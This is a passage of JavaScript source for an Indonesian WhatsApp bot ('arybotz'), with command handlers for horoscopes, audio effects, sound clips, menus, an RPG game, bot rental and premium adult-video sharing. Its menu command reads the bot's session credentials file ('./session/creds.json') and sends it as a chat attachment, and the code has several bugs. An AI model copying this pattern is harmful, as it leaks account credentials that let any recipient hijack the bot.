                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} 12, 1, 2022`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix+ command} 7 7 2005`)
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') return date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'shio': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
                let anu = await primbon.shio(text)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hasil :* ${anu.message}`, m)
            }
            break
            
            case 'bass': 
            case 'blown': 
            case 'deep': 
            case 'earrape': 
            case 'fast': 
            case 'fat': 
            case 'nightcore': 
            case 'reverse': 
            case 'robot': 
            case 'slow': 
            case 'smooth': 
            case 'tupai': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return newReply(err)
                let buff = fs.readFileSync(ran)
                conn.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else newReply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                newReply(e)
                }
                }
            break
            
            /*
            case 'setcmd': {
                if (!m.quoted) return newReply('Reply Pesan!')
                if (!m.quoted.fileSha256) return newReply('SHA256 Hash Tidak Ditemukan ❎')
                if (!text) return newReply(`Untuk Command Apa?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return newReply('Anda Tidak Diizinkan Untuk Mengubah Perintah Stiker Ini ❎')
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: +new Date,
                    locked: false,
                }
                newReply(mess.done)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return newReply(`Tidak Ada Hash`)
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return newReply('Anda Tidak Diizinkan Untuk Mengubah Perintah Stiker Ini ❎')
                delete global.db.data.sticker[hash]
                newReply(mess.done)
            }
            break
            case 'listcmd': {
                let teks = `*List Hash 🚀*
Info: *bold* hash is Locked 🔒

*Hash ☕ :*
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                conn.sendText(m.chat, teks, m, {
                    mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a, b) => [...a, ...b], [])
                })
            }
            break
            case 'lockcmd': {
                if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                if (!m.quoted) return newReply('Reply Pesan!')
                if (!m.quoted.fileSha256) return newReply('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) return newReply('Hash Not Found In Database')
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                newReply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) return newReply('Reply Message Yang Ingin Disave Di Database')
                if (!text) return newReply(`Contoh : ${prefix + command} Nama File`)
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) return newReply(`'${text}' Telah Terdaftar Di List Pesan`)
                msgs[text.toLowerCase()] = quoted.fakeObj
                newReply(`Berhasil Menambahkan Pesan Di List Pesan Sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) return newReply(`Contoh : ${prefix + command} File Name\n\nLihat List Pesan Dengan ${prefix}listmsg`)
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return newReply(`'${text}' Tidak Terdaftar Di List Pesan`)
                conn.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
                let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => {
                    return {
                        nama,
                        ...isi
                    }
                })
                let teks = 'LIST DATABASE 📂\n\n'
                for (let i of seplit) {
                    teks += `📛 *Name :* ${i.nama}`
                    teks += `🚀 *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
                }
                newReply(teks)
            }
            break
            case 'delmsg':
            case 'deletemsg': {
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return newReply(`'${text}' tidak terdaftar didalam list pesan`)
                delete msgs[text.toLowerCase()]
                newReply(`Berhasil menghapus '${text}' dari list pesan`)
            }
            break
            */
            case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')	
if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 3
koi = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await conn.sendMessage(m.chat, { audio: koi, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
break
case 'viral': case 'nsfwvid': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isPremium) return newReply(`Om Sangean!!`)
if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 50
newReply(`Limit Berkurang -50`)
let asik = JSON.parse(fs.readFileSync('./lib/zaenar-18+.json'))
 let asik1 = (pickRandom(asik))
await conn.sendMessage(m.chat, { video: asik1, caption: `Kesukaan Owner Ini Mah🥴`, quoted: m })
}
break
case 'menu': case 'help': case 'command': case 'cmd': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
await loading()
let doc = await fs.readFileSync('./session/creds.json')
if(time2 < "23:59:00"){
        var ucapanMenu = '👋 sᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ'
        }
        if(time2 < "19:00:00"){
        var ucapanMenu = '👋 sᴇʟᴀᴍᴀᴛ ᴘᴇᴛᴀɴɢ'
        }
        if(time2 < "18:00:00"){
        var ucapanMenu = '👋 sᴇʟᴀᴍᴀᴛ sᴏʀᴇ'
        }
        if(time2 < "15:00:00"){
        var ucapanMenu = '👋 sᴇʟᴀᴍᴀᴛ sɪᴀɴɢ️'
        }
        if(time2 < "10:00:00"){
        var ucapanMenu = '👋 sᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ'
        }
        if(time2 < "05:00:00"){
        var ucapanMenu = '👋 sᴇʟᴀᴍᴀᴛ sᴜʙᴜʜ'
        }
        if(time2 < "03:00:00"){
        var ucapanMenu = '👋 sᴇʟᴀᴍᴀᴛ ᴛᴇɴɢᴀʜ ᴍᴀʟᴀᴍ'
        }
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
usertod = db.data.users[m.sender]
let { min, max, xp } = levelling.xpRange(usertod.level, global.multiplier)
    let anu =`ʜᴀʟᴏ ᴋᴀᴋ ${ucapanMenu} ᴀᴋᴜ ᴀᴅᴀʟᴀʜ *aʀy ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ* ʏᴀɴɢ ʙɪsᴀ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀᴍᴜ ᴅᴀʟᴀᴍ ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ, ᴍᴇᴍʙᴜᴀᴛ, ᴅʟʟ:3

╭───「 *aʀy-ʙᴏᴛ* 」
│ ◦  ᴍᴇʟɪʜᴀᴛ sᴇᴍᴜᴀ ᴍᴇɴᴜ: *.ᴀʟʟᴍᴇɴᴜ*
│ ◦  ᴅᴀғᴛᴀʀ: *.ʀᴇɢɪsᴛᴇʀ*
╰────
ʀᴇᴘᴏʀᴛ ʙᴜɢ? ʀᴇǫᴜᴇsᴛ ғɪᴛᴜʀ? *.ʀᴇᴘᴏʀᴛ* *.ʀᴇǫᴜᴇsᴛ*
ʙᴇʟɪ ᴘʀᴇᴍɪᴜᴍ ᴄʜᴀᴛ ᴀᴛᴀᴜ sᴇᴡᴀ? ᴄʜᴀᴛ .ᴏᴡɴᴇʀ

≡ aʀ ʙᴏᴛ ʙʏ arybotz 2023-2025`

conn.sendMessage(m.chat, {
          document: doc, 
          mimetype: 'application/txt', 
          pageCount: 2023,
          fileName: `Halo ${isRegistered ? `${NamaKamu(m.sender)}` : `${pushname}`}`,
          fileLength: 1000000000000000,
          caption: anu, 
          contextInfo: {
            forwardingScore: 2023, 
            isForwarded: true,
            externalAdReply: {
              title: 'Arybotz Multi Device',
              body: `${thisDay} ${tanggal} ${arrbulan[bulan]} ${tahun}`,
              mediaType: 1,
              thumbnailUrl: `${global.thurl}`,
              mediaUrl: 'https://instagram.com/aryjuandatarigan',
              thumbnail: ``,
              sourceType: ``,
              sourceId: ``,
              sourceUrl: sig,
              containsAutoReply: true,
              renderLargerThumbnail: true,
              showAdAttribution: false,
              ctwaClid: ``,
              ref: ``
            }
          }
        }, {
          quoted: fkontak
        })      
}
break


case 'rpg': case 'rpgmenu': case 'menurpg': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (q.includes('--help')) return newReply(`
tׁׁׅׅυׁׅtׁׁׅׅᨵׁׅׅꭈׁׅꪱׁׁׁׅׅׅɑׁׅᥣׁׅ֪ 👨‍🏫📓

*[ ʜᴏᴡ ᴛᴏ ᴘʟᴀʏ ʀᴘɢ ]*
.ᴄʟᴀɪᴍ < sᴛᴀᴛᴇʀᴘᴀᴄᴋ >
.ᴍᴜʟᴜɴɢ
.ʜᴇᴀʟ < ᴜɴᴛᴜᴋ ᴍᴇɴɢɪsɪ ɴʏᴀᴡᴀ / ʜᴇᴀʟᴛʜ >
.ʙᴜʏ ᴘᴏᴛɪᴏɴ < ᴍᴇᴍʙᴇʟɪ >
.ᴘʀᴏғɪʟᴇ < ᴍᴇʟɪʜᴀᴛ ᴘʀᴏғɪʟᴇ ᴍᴜ >
.ɪɴᴠ
.ɪɴᴠᴇɴᴛᴏʀʏ
.ʙᴀʟ < ᴍᴇɴɢᴇᴄᴇᴋ ᴜᴀɴɢ ᴍᴜ >
*【 📔 Cek Di Menu 】*
*© a𝚛 𝚖𝚍 𝟸𝟶𝟸𝟹-𝟸𝟶𝟸𝟾*

`) 
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
let anu =`
ᴊɪᴋᴀ ᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴘᴇʀɴᴀʜ ᴊᴏɪɴʀᴘɢ ᴋᴇᴛɪᴋ .ᴊᴏɪɴʀᴘɢ ᴀɢᴀʀ ᴋᴀᴍᴜ ᴍᴀsᴜᴋ ᴋᴇ ᴅᴀᴛᴀʙᴀsᴇ ʀᴘɢ, ᴊɪᴋᴀ ᴛɪᴅᴀᴋ ᴍᴇʟᴀᴋᴜᴋᴀɴ .ᴊᴏɪɴʀᴘɢ ᴍᴀᴋᴀ ᴅᴀᴛᴀ ʀᴘɢ ᴋᴀᴍᴜ ᴀᴋᴀɴ ᴅɪ ʀɪsᴇᴛ

╭── •  *「 ᴀʙᴏᴜᴛ 」*
│  ◦ *ɴᴀᴍᴇ:* ${isRegistered ? `${NamaKamu(m.sender)}` : `${pushname}`}
│  ◦ *ᴍᴏɴᴇʏ:* $${(getMonay(m.sender))}
╰─── •
╭── •  *「 ɪɴғᴏ 」*
│ *Mᴏɴᴇʏ:* $${(getMonay(m.sender))}
│ *Gᴏʟᴅ:* ${getEmas(m.sender)}
│ *Iʀᴏɴ:* ${getBesi(m.sender)}
│ *Fɪꜱʜ:* ${getIkan(m.sender)}
│ *Dɪᴀᴍᴏɴᴅ:* ${getEmerald(sender)}
╰─── •
╭── •「 *ʀ ᴘ ɢ* 」
│◦ .ᴄʟᴀɪᴍ
│◦ .ᴊᴜᴀʟ
│◦ .ᴏᴘᴇɴʙᴏ
│◦ .ᴍᴀɴᴄɪɴɢ
│◦ .ᴍɪɴɪɴɢ
│◦ .ɪɴᴠ
│◦ .ʙᴇʀʙᴜʀᴜ
│◦ .ᴍᴜʟᴜɴɢ
│◦ .ᴋᴇʀᴊᴀ
│◦ .sʜᴏᴘ
│◦ .ʀᴘɢ
│◦ .ᴊᴏɪɴʀᴘɢ
│◦ .ɢᴀᴊɪᴀɴ
│◦ .ᴍᴇ
│◦ .ʜᴇᴀʟ
│◦ .ᴋᴇʀᴊᴀ
│◦ .ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ
│◦ .ʀᴜᴍᴀʜ (ᴄᴇᴋ ʀᴜᴍᴀʜ ᴋᴀᴍᴜ) 
│◦ .ʙᴜɪʟᴅ (ᴍᴇᴍʙᴜᴀᴛ ʀᴜᴍᴀʜ ᴅʟʟ) 
│◦ .ɴᴇʙᴀɴɢ
│◦ .ᴄᴏᴏᴋ (ᴍᴇᴍᴀsᴀᴋ) 
│◦ .ᴍᴀᴋᴀɴᴀɴ (ᴄᴇᴋ ᴍᴀᴋᴀɴᴀɴ ᴋᴀᴍᴜ) 
│◦ .ᴍᴀᴋᴀɴ (ᴀɢᴀʀ ʙᴀʀ ᴍᴇɴɪɴɢᴋᴀᴛ) 
│◦ .ᴛɪᴅᴜʀ (ᴀɢᴀʀ ᴋᴀᴍᴜ ᴘᴜʟɪʜ) 
│◦ .ᴘᴇʀᴛᴀɴɪᴀɴ (ᴄᴇᴋ ᴘᴇʀᴛᴀɴɪᴀɴ ᴋᴀᴍᴜ) 
│◦ .ᴛғ (ᴛʀᴀɴsᴀᴋsɪ) 
│◦ .ʙᴇʀᴛᴀʀᴜɴɢ @tag
│◦ .sᴘɪɴ <ᴊᴜᴍʟᴀʜ>
│◦ .sʟᴏᴛ <ᴊᴜᴍʟᴀʜ>
│◦ .ᴍᴇᴍʙᴜɴᴜʜ @tag
│◦ .ʙᴀɴsᴏs <ᴛᴀɢ ғʀɪᴇɴᴅ>
│◦ .ᴘᴇᴛᴜᴀʟᴀɴɢ
│◦ .ɴɢᴏᴊᴇᴋ
│◦ .ᴅᴜɴɢᴇᴏɴ
│◦ .ɴɢᴇᴡᴇ
│◦ .ᴍʏᴅᴏᴍᴘᴇᴛ
│◦ .ɢᴀᴄʜᴀ
╰──···· •

 ${global.wm}
`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: false,
        title: namabot,
        body: wm,
        sourceUrl: sig,
        thumbnailUrl: "https://telegra.ph/file/68b486d8d932679ffafd9.jpg",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'joinrpg': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')	
if (isJoin) return newReply(mess.joinrpg)

let monaynya = 1000 * isCmd
db.data.users[m.sender].money += monaynya
let anuanu = `*Successfully Joining Rpg*

🧾 *Information / Rules*
tidak boleh curang saat memainkan game, jika ada bug laporkan ke own/mod 

🎁 *Reward*
kamu mendapatkan bahan untuk memulai rpg cek di .inv`
zharzxx = fs.readFileSync('./media/zr.jpg')
                veri = m.sender
                if (!m.isGroup) {
                    addJoinUser(m.sender)
    conn.sendMessage(m.chat, {
    text: anuanu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: false, 
        body: `${global.wm}`,
        thumbnailUrl: `${global.thurl}`,
        sourceUrl: "https://join rpg",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
                    
                } else {
                    addJoinUser(m.sender)
    conn.sendMessage(m.chat, {
    text: anuanu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: false, 
        body: `${global.wm}`,
        thumbnailUrl: `${global.thurl}`,
        sourceUrl: "https://join rpg",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
                    
                    }}
		break
case 'sewa': case 'sewabot': case 'belibot': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
let anu =`彡 *S E W A*
ᴜɴᴛᴜᴋ ᴍᴇɴʏᴇᴡᴀ ʙᴏᴛ ᴋᴀᴍᴜ̈ ʙɪsᴀ ᴍᴇᴍᴀᴋᴀɪ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ɪɴɪ:
╭─ ◦ *ᴘᴀʏᴍᴇɴᴛ*
│ 6285762008398 < ᴅᴀɴᴀ / arybotz > < ᴘᴜʟsᴀ / xsɪs >
╰─ ≂

╭─ ◦ *ʜᴀʀɢᴀ*
│ 5 ʜᴀʀɪ > ɪᴅʀ 2ᴋ
│ 1 ᴍɪɴɢɢᴜ > ɪᴅʀ 3ᴋ
│ 5 ᴍɪɴɢɢᴜ > ɪᴅʀ 10ᴋ
│ 1 ʙᴜʟᴀɴ > ɪᴅʀ 30ᴋ
╰─ ≂

*ᴄʜᴀᴛ ᴏᴡɴᴇʀ .ᴏᴡɴᴇʀ ᴜɴᴛᴜᴋ ᴍᴇʟᴀᴋᴜᴀɴ ᴛʀᴀɴsᴀᴋsɪ ʏᴀɴɢ ʟᴀɪɴɴʏᴀ* `
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `Sewa List :3 © AR-MD`,
        body: `${global.wm}`,
        thumbnailUrl: `${global.thurl}`,
        sourceUrl: "https://chat.whatsapp.com/D154truBoj0C27OE3XBYXa",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   }
break
case 'balancetolimit': case 'btol': {
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(m.sender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }
if (!text) return reply(`Masukan Jumlah Balance Yang Ingin Di Ubah Menjadi Limit, *Example:* .balancetolimit 3000`)
let isi = args[0]
if (isMonay < isi) return reply(`Balance Kamu Tidak Mencukupi`)
db.data.users[m.sender].limit += isi;
db.data.users[m.sender].money -= isi
}
break
case 'tqto': case 'credits': case 'credits': { //TAMBAHIN BOLEH, ASAL JANGAN DIHAPUS
let anu = `乂 *C R E D I T S  B A S E*
  ◦ ZaenarNishimura (Development)
  ° Ary Juanda 
  ◦ @adiwajshing/baileys (Modules)
  ◦ @whiskeysockets/baileys (Modules)  
  ◦ Api (Lolhuman And Other)
  ◦ Support (User, My Friend)

*Thanks All.. ☺*`
conn.sendMessage(m.chat, {
          document: doc, 
          mimetype: 'application/txt', 
          pageCount: 2023,
          fileName: `乂 C R E D I T S  ( Script )`,
          fileLength: 1000000000000000,
          caption: anu, 
          contextInfo: {
            forwardingScore: 2023, 
            isForwarded: true,
            externalAdReply: {
              title: 'Arybotz Multi Device',
              body: `${thisDay} ${tanggal} ${arrbulan[bulan]} ${tahun}`,
              mediaType: 1,
              thumbnailUrl: `${global.thurl}`,
              mediaUrl: 'https://instagram.com/aryjuandatarigan',
              thumbnail: ``,
              sourceType: ``,
              sourceId: ``,
              sourceUrl: sig,
              containsAutoReply: true,
              renderLargerThumbnail: true,
              showAdAttribution: false,
              ctwaClid: ``,
              ref: ``
            }
          }
        }, {
          quoted: fkontak
        })      
}
break
case 'allmenu': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
await loading()
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')	
if(time2 < "23:59:00"){
        var ucapanMenu = 'sᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ'
        }
        if(time2 < "19:00:00"){
        var ucapanMenu = 'sᴇʟᴀᴍᴀᴛ ᴘᴇᴛᴀɴɢ'
        }
        if(time2 < "18:00:00"){
        var ucapanMenu = 'sᴇʟᴀᴍᴀᴛ sᴏʀᴇ'
        }
        if(time2 < "15:00:00"){
        var ucapanMenu = 'sᴇʟᴀᴍᴀᴛ sɪᴀɴɢ'
        }
        if(time2 < "10:00:00"){
        var ucapanMenu = 'sᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ'
        }
        if(time2 < "05:00:00"){
        var ucapanMenu = 'sᴇʟᴀᴍᴀᴛ sᴜʙᴜʜ'
        }
        if(time2 < "03:00:00"){
        var ucapanMenu = 'sᴇʟᴀᴍᴀᴛ ᴛᴇɴɢᴀʜ ᴍᴀʟᴀᴍ'
        }
    let anu =`Halo Kak ${isRegistered ? `${NamaKamu(m.sender)}` : `${pushname}`} ${ucapanMenu} 👋

Aku adalah *ary-Botz || MultiDevice* yang terbuat dari Node.js, dan kegunaanku adalah untuk melakukan otomatisasi pesan, memberikan informasi, atau menjalankan tugas-tugas tertentu sesuai dengan kebutuhan Anda.

╭── •「 *s ᴛ ᴀ ʀ ᴛ* 」
│◦ .ʀᴇɢᴍᴀɪʟ (ᴇᴍᴀɪʟ) 
│◦ .ʀᴇɢɪsᴛᴇʀ (ɴᴀᴍᴀ.ᴜᴍᴜʀ) 
│◦ .ʀᴇɢᴡᴀ
│◦ .ᴛǫᴛᴏ
│◦ .sᴄ
│◦ .ᴏᴡɴᴇʀ
│◦ .ᴠᴇʀsɪᴏɴ
│◦ .ᴛᴏᴛᴀʟғɪᴛᴜʀ
╰──···· •
╭── •「 *ᴏ ᴡ ɴ ᴇ ʀ* 」
│◦ .ʟɪsᴛᴘᴄ
│◦ .ʟɪsᴛɢᴄ
│◦ .updateinfo
│◦ .ᴘᴜʙʟɪᴄ
│◦ .sᴇʟғ
│◦ .ᴇɴᴄ
│◦ .gconly <on/off>
